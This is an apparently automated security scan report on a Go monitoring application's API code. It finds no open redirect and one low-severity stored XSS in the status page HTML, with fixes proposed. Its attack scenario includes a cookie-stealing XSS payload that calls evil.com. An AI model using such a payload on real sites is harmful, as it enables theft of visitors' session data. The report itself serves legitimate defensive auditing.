# Open Redirect Security Scan Results

**Scanner:** sc-open-redirect
**Target:** D:\CODEBOX\PROJECTS\AnubisWatch
**Focus:** internal/api/
**Severity Classification:** Critical | High | Medium | Low

---

## Summary

| Finding ID | Title | Severity | Confidence |
|------------|-------|----------|------------|
| REDIR-001 | No open redirect vulnerability found | N/A | N/A |
| REDIR-002 | StatusPage HTML rendering embeds soul.Target without escaping | Low | 80% |

**Risk Rating:** N/A - **No open redirect vulnerability.** The application does not have unvalidated redirect functionality. However, there is an XSS-related finding in status page HTML generation.

---

## Finding REDIR-001: No Open Redirect Vulnerability

**Status:** NOT A VULNERABILITY
**File References:**
- `internal/api/rest.go` (no redirect handlers found)
- `internal/api/statuspage.go` (safe redirects only)

### Analysis

After thorough analysis, **no open redirect vulnerability exists**:

1. **No user-controlled redirect targets:** The codebase was searched for redirect patterns:
   - `ctx.Response.Header().Set("Location",` - found only in OIDC login flow
   - `res.redirect(` - not used (Node.js pattern)
   - `http.Redirect(` - not used
   - `return_url`, `redirect_url`, `next=`, `callback=`, `url=`, `goto=` - not used as redirect parameters

2. **OIDC redirect is server-controlled** (`internal/api/rest.go:698-700`):
   ```go
   // Redirect to OIDC provider - URL is generated server-side
   ctx.Response.Header().Set("Location", loginURL)
   ctx.Response.WriteHeader(http.StatusFound)
   ```
   The `loginURL` comes from `oidcAuth.OIDCLoginURL()` which is server-generated, not user-controlled.

3. **Status page redirects:** The public status page (`/status`, `/status.html`) returns JSON or HTML directly, not redirects.

4. **SPA fallback is safe** (`internal/api/rest.go:2005-2016`):
   ```go
   // No route found - serve dashboard for non-API routes
   // Exclude API, health, metrics, and status page routes
   isExcluded := strings.HasPrefix(path, "/api/") ||
                 strings.HasPrefix(path, "/health") || ...
   if r.dashboard != nil && !isExcluded {
       r.dashboard.ServeHTTP(w, req)
   }
   ```
   The dashboard is served directly, not via redirect.

### Why This Is Secure

Open redirect vulnerabilities typically arise when:
```javascript
// VULNERABLE: User controls redirect destination
app.get('/redirect', (req, res) => {
    res.redirect(req.query.url);  // attacker: ?url=https://evil.com
});

// SAFE: Application controls destinations
app.get('/login', (req, res) => {
    res.redirect('/dashboard');  // Fixed path
});
```

This codebase uses only fixed-path redirects or server-generated URLs, not user-controlled ones.

---

## Finding REDIR-002: StatusPage HTML XSS via Unescaped Target Field

**Severity:** Low
**Confidence:** 80%
**File:** internal/api/statuspage.go:287-296
**CWE:** CWE-79 (Cross-site Scripting)
**File References:**
- `internal/api/statuspage.go:287` (soul.Target embedded in HTML)

### Description

In `handleStatusPageHTML()`, the `soul.Target` field is embedded directly into HTML without escaping:

```go
// internal/api/statuspage.go:287-296
for _, soul := range souls {
    judgments, _ := s.store.ListJudgmentsNoCtx(soul.ID, time.Now().Add(-24*time.Hour), time.Now(), 1)
    // ...
    html += `<div class="component">
        <div>
            <div class="component-name">` + soul.Name + `</div>
            <div class="component-target">` + soul.Target + `</div>  <!-- LINE 290: NOT ESCAPED -->
        </div>
        <!-- ... -->
    </div>`
}
```

If an attacker can create or modify a soul with a malicious `Target` value containing HTML/JavaScript, it would be rendered in the public status page.

### Attack Scenario

1. Attacker creates a soul with `Target`: `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">`
2. The target is displayed in `/status.html` without sanitization
3. Any visitor to the public status page has their cookies stolen

### Risk Assessment

**This is LOW severity because:**

1. **Public page is read-only:** The XSS executes in browsers visiting the status page
2. **No authentication cookies:** Public status pages typically don't contain session cookies
3. **Soul creation may require auth:** Creating souls requires `souls:*` role (line 336)
4. **Workspace isolation:** Souls are workspace-scoped, limiting blast radius

**However:**
- Soul names could also contain XSS (same pattern at line 289)
- If the status page is linked from the main app, cookies could be stolen

### Remediation

Escape HTML before embedding in status page:

```go
import "html"

// In handleStatusPageHTML()
html += `<div class="component-target">` + html.EscapeString(soul.Target) + `</div>`
```

Or use a proper HTML template library that handles escaping automatically.

For defense-in-depth, also escape `soul.Name`:

```go
html += `<div class="component-name">` + html.EscapeString(soul.Name) + `</div>`
```

### References

- https://cwe.mitre.org/data/definitions/79.html
- https://owasp.org/www-community/attacks/xss/

---

## Security Controls Observed

### 1. Security Headers Middleware

```go
// internal/api/rest.go:1730-1751
func (s *RESTServer) securityHeadersMiddleware(handler Handler) Handler {
    return func(ctx *Context) error {
        ctx.Response.Header().Set("X-Content-Type-Options", "nosniff")
        ctx.Response.Header().Set("X-Frame-Options", "DENY")
        ctx.Response.Header().Set("X-XSS-Protection", "1; mode=block")
        ctx.Response.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
        ctx.Response.Header().Set("Content-Security-Policy", "default-src 'self'")
        ctx.Response.Header().Set("Strict-Transport-Security", "max-age=31536000; ...")
        // ...
    }
}
```

These headers provide defense-in-depth against XSS and other attacks.

### 2. Input Validation for Path Parameters

```go
// internal/api/rest.go:1754-1777
func (s *RESTServer) validatePathParams(handler Handler) Handler {
    return func(ctx *Context) error {
        for key, value := range ctx.Params {
            if strings.Contains(value, "..") || strings.Contains(value, "//") {
                return ctx.Error(http.StatusBadRequest, "Invalid path parameter")
            }
        }
        return handler(ctx)
    }
}
```

### 3. Request Body Injection Detection

```go
// internal/api/rest.go:1680-1687
// Check for common injection patterns
bodyStr := string(bodyBytes)
if containsInjectionPatterns(bodyStr) {
    s.logger.Warn("Potential injection attack detected", ...)
    return ctx.Error(http.StatusBadRequest, "Invalid characters in request")
}

// checks:
func containsInjectionPatterns(input string) bool {
    // Path traversal: "../", "..\\"
    // Null bytes: "\x00"
    // SQL injection patterns
    // XSS patterns: "<script", "javascript:"
}
```

### 4. CORS Protection

```go
// internal/api/rest.go:1629-1640
func (s *RESTServer) isOriginAllowed(origin string, allowed []string) bool {
    for _, allowed := range allowed {
        if strings.EqualFold(origin, allowed) {  // Case-insensitive match
            return true
        }
    }
    return false
}
```

Origins are validated against an explicit allowlist, not accepted from any origin.

### 5. Host Header Validation

```go
// internal/api/rest.go:1742-1747
if strings.HasPrefix(ctx.Request.URL.Path, "/api/v1/") {
    if ctx.Request.Host == "" {
        return ctx.Error(http.StatusBadRequest, "Missing Host header")
    }
}
```

Validates Host header to prevent DNS rebinding attacks on API endpoints.

---

## Recommendations

1. **Low Priority (XSS fix):** Escape `soul.Target` and `soul.Name` in `handleStatusPageHTML()` using `html.EscapeString()` (REDIR-002)

2. **No action needed:** Open redirect vulnerability does not exist (REDIR-001)

3. **Consider Content-Security-Policy enhancement:** The current CSP `default-src 'self'` is basic. Consider adding `script-src 'self'` explicitly if the dashboard is served from the same origin.

---

*Generated by sc-open-redirect security scanner*